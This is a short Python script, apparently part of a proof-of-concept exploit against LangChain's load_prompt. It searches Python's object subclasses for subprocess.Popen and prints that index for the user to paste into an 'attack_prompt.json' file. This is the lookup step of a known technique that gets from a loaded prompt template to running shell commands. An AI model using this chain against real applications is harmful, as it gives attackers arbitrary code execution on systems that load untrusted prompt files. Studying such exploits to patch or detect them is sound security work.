from langchain.prompts import load_prompt
subclasses = ''.__class__.__bases__[0].__subclasses__()
target_index = [i for i in range(len(subclasses)) if str(subclasses[i]).find('subprocess.Popen') != -1][0]
print(f'subprcess.Popen index: {target_index}.\nReplace target_index in attack_prompt.json with this value.')